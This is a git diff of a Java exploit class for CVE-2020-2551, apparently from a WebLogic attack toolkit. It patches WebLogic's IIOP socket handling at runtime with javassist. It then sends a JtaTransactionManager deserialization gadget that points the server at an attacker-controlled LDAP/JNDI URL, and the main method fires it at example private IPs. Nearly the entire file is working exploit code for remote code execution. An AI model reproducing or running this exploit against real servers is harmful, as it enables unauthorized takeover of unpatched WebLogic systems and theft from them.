@@ -1,18 +1,18 @@
 package com.r4v3zn.weblogic.tools.payloads.impl;
 
-import cn.hutool.core.lang.JarClassLoader;
 import com.r4v3zn.weblogic.tools.annotation.Authors;
 import com.r4v3zn.weblogic.tools.annotation.Dependencies;
+import com.r4v3zn.weblogic.tools.annotation.Versions;
 import com.r4v3zn.weblogic.tools.entity.MyException;
 import com.r4v3zn.weblogic.tools.gadget.impl.JtaTransactionManagerGadget;
 import com.r4v3zn.weblogic.tools.payloads.VulTest;
-import com.r4v3zn.weblogic.tools.translator.MyTranslator;
 import javassist.*;
+import lombok.extern.log4j.Log4j2;
+import org.apache.logging.log4j.Level;
+
 import javax.naming.Context;
 import javax.naming.InitialContext;
-import javax.naming.NamingException;
-import java.io.File;
-import java.net.InetAddress;
+import java.lang.reflect.Method;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLClassLoader;
@@ -20,7 +20,7 @@ import java.util.ArrayList;
 import java.util.Hashtable;
 import java.util.List;
 
-import static com.r4v3zn.weblogic.tools.gadget.impl.JtaTransactionManagerGadget.JTATRANSACTIONMANAGER_CLASS_NAME;
+import static com.r4v3zn.weblogic.tools.translator.MyTranslator.IIOP_SOCKET_CLASS_NAME;
 import static com.r4v3zn.weblogic.tools.utils.VersionUtils.getVersion;
 import static org.apache.commons.lang3.StringUtils.isBlank;
 
@@ -44,7 +44,12 @@ import static org.apache.commons.lang3.StringUtils.isBlank;
  */
 @Authors({Authors.R4V3ZN})
 @Dependencies({":com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager"})
+@Versions({"10.3.6.0", "12.1.3.0", "12.1.4.0"})
+@Log4j2
 public class CVE_2020_2551 implements VulTest {
+    private static final String POC_NAME = "com.bea.core.repackaged.springframework.spring.jar";
+    private static final String POC_LOG = "com.bea.core.repackaged.apache.commons.logging.jar";
+    private static final String FULL_CLIENT = "wlfullclient.jar";
 
     /**
      * 漏洞影响版本
@@ -57,13 +62,6 @@ public class CVE_2020_2551 implements VulTest {
     }};
 
     /**
-     * IIOP SOCKET Class name
-     * "weblogic.socket.SocketMuxer";
-     * "weblogic.iiop.MuxableSocketIIOP";
-     */
-    private static final String IIOP_SOCKET_CLASS_NAME= "weblogic.iiop.MuxableSocketIIOP";
-
-    /**
      * 漏洞验证,漏洞存在返回 true 否则返回 false
      * @param ip ip
      * @param port 端口
@@ -74,28 +72,36 @@ public class CVE_2020_2551 implements VulTest {
         // weblogic version
         String version = getVersion(ip, port);
         System.out.println("[*] weblogic version --> "+version);
+//        log.info("[*] weblogic version --> "+version);
         if(isBlank(version) || !VUL_VERSIONS.contains(version)){
             return false;
         }
         URLClassLoader urlClassLoader = null;
+        ClassPool classPool = null;
         try{
             urlClassLoader = loadClass(version);
-            hookSocket(ip, port);
+            classPool = hookSocket(ip, port);
         }catch (Exception e){
             e.printStackTrace();
             return false;
         }
-        if(param.length == 0){
-            throw new MyException("请输入JNDI URL");
+        String jndiUrl = "balabalabala://127.0.0.1:6789/Exploit";
+        if(param.length > 0){
+            jndiUrl = param[0];
         }
-        String jndiUrl = param[0];
-        Hashtable<String, String> env = new Hashtable<String, String>();
+        Hashtable<String, String> env = new Hashtable<>();
         env.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
         env.put("java.naming.provider.url" , String.format("iiop://%s:%s", ip, port));
         Context context = null;
         try {
+//            Loader loader = new Loader(classPool);
+//            Class clazz = loader.loadClass("weblogic.jndi.WLInitialContextFactory");
+//            clazz = Class.forName("weblogic.jndi.WLInitialContextFactory");
+//            clazz.getDeclaredMethod("getInitialContext", Hashtable.class).invoke(clazz.newInstance(), env);
+//            Method method = clazz.getDeclaredMethod("getInitialContext", Hashtable.class);
+//            method.invoke(objectClient, env);
             context = new InitialContext(env);
-        } catch (NamingException e) {
+        } catch (Exception e) {
             e.printStackTrace();
             return false;
         }
@@ -105,6 +111,7 @@ public class CVE_2020_2551 implements VulTest {
             object = payload.getObject(jndiUrl,urlClassLoader);
         } catch (Exception e) {
             e.printStackTrace();
+            urlClassLoader.close();
             return false;
         }
         try{
@@ -112,11 +119,15 @@ public class CVE_2020_2551 implements VulTest {
         }catch (Exception e){
             String msg = e.getMessage();
             if("Unhandled exception in rebind()".equals(msg)){
+                urlClassLoader.close();
                 return true;
             }else{
+                urlClassLoader.close();
                 return false;
             }
         }
+        urlClassLoader.close();
+        System.gc();
         return false;
     }
 
@@ -126,19 +137,21 @@ public class CVE_2020_2551 implements VulTest {
      * @throws NotFoundException
      */
     public URLClassLoader loadClass(String version) throws NotFoundException, MalformedURLException {
-        String pocName = "com.bea.core.repackaged.springframework.spring.jar";
-        String pocLog = "com.bea.core.repackaged.apache.commons.logging.jar";
         System.out.println("[*] load class com.bea.core.repackaged.springframework.spring.jar version --> "+version);
+//        log.debug("[*] load class com.bea.core.repackaged.springframework.spring.jar version --> "+version);
         String path = this.getClass().getResource("/lib/").getPath();
-        String pocNamePath = path +"12.2.1.3.0/" + pocName;
-        String pocLogPath = path +"12.2.1.3.0/" + pocName;
+        String pocNamePath = path +"12.2.1.3.0/" + POC_NAME;
+        String pocLogPath = path +"12.2.1.3.0/" + POC_LOG;
+        String fullClientPath = path + FULL_CLIENT;
         if(version.contains("10.3.6") || version.contains("12.1.3")){
-            pocNamePath = path + "10.3.6.0.0/" + pocName;
-            pocLogPath = path + "10.3.6.0.0/" + pocLog;
+            pocNamePath = path + "10.3.6.0.0/" + POC_NAME;
+            pocLogPath = path + "10.3.6.0.0/" + POC_LOG;
         }
         System.out.println("[*] jat path --> "+pocNamePath);
         System.out.println("[*] jat log path --> "+pocLogPath);
-        URL[] urls = new URL[]{new URL("file:"+pocNamePath)};
+//        log.debug("[*] jat path --> "+pocNamePath);
+//        log.debug("[*] jat log path --> "+pocLogPath);
+        URL[] urls = new URL[]{new URL("file:"+pocNamePath), new URL("file:"+pocLogPath)};
         return new URLClassLoader(urls);
     }
 
@@ -148,31 +161,33 @@ public class CVE_2020_2551 implements VulTest {
      * @param port port
      * @throws Exception
      */
-    public void hookSocket(String ip, Integer port) throws Exception {
-        System.gc();
-        ClassPool cp = new ClassPool(true);
+    public ClassPool hookSocket(String ip, Integer port) throws Exception {
+        ClassPool cp = ClassPool.getDefault();
+//        String path = this.getClass().getResource("/lib/").getPath();
+//        String fullClientPath = path + FULL_CLIENT;
+//        cp.insertClassPath(fullClientPath);
         CtClass ctClass = cp.get(IIOP_SOCKET_CLASS_NAME);
-        ctClass.defrost();
-        if(ctClass.isFrozen()){
-
-        }
         String code = "{" +
                 "$1 = java.net.InetAddress.getByName(\"" + ip + "\");\n" +
                 "$2 = " + port + ";}";
-        CtMethod ctMethod = ctClass.getDeclaredMethod("connect", new CtClass[]{cp.get(InetAddress.class.getName()), cp.get("int")});
-        ctMethod.insertBefore(code);
+        code = "{\n" +
+                "    java.net.InetAddress inet = java.net.InetAddress.getByName(\""+ip+"\");\n" +
+                "    $1 = inet;\n" +
+                "    java.net.Socket var4 = new java.net.Socket();\n" +
+                "    initSocket(var4);\n" +
+                "    var4.connect(new java.net.InetSocketAddress($1, $2), $3);\n" +
+                "    return var4;\n" +
+                "}";
+//        CtMethod ctMethod = ctClass.getDeclaredMethod("connect", new CtClass[]{cp.get(InetAddress.class.getName()), cp.get("int")});
+//        ctMethod.insertBefore(code);
+        CtMethod ctMethod = ctClass.getDeclaredMethods("newSocket")[1];
+        if(ctClass.isFrozen()){
+            ctClass.defrost();
+        }
+        ctMethod.setBody(code);
         ctClass.toClass();
-//        ctClass.stopPruning(true);
-//        ctClass.defrost();
-//        CtMethod ctMethod = ctClass.getDeclaredMethods("newSocket")[1];
-//        ctMethod.setBody("{\n" +
-//                "    java.net.InetAddress inet = java.net.InetAddress.getByName(\""+ip+"\");\n" +
-//                "    $1 = inet;\n" +
-//                "    java.net.Socket var4 = new java.net.Socket();\n" +
-//                "    initSocket(var4);\n" +
-//                "    var4.connect(new java.net.InetSocketAddress($1, $2), $3);\n" +
-//                "    return var4;\n" +
-//                "}");    }
+        ctClass.freeze();
+        return cp;
     }
 
     /**
@@ -189,9 +204,8 @@ public class CVE_2020_2551 implements VulTest {
     public static void main(String[] args) throws Exception {
         CVE_2020_2551 vul = new CVE_2020_2551();
         String jdnUrl = "ldap://192.168.1.6:1099/poc";
-
-        vul.vulnerable("192.168.1.10", 7001,jdnUrl);
-        vul.vulnerable("192.168.1.3", 7001,jdnUrl);
-//        vul.loadClass("10.3.6.0");
+        System.out.println(vul.vulnerable("192.168.1.10", 7001,jdnUrl));
+        vul.vulnerable("192.168.1.12", 7001,jdnUrl);
+//        vul.vulnerable("192.168.1.3", 7001,jdnUrl);
     }
 }
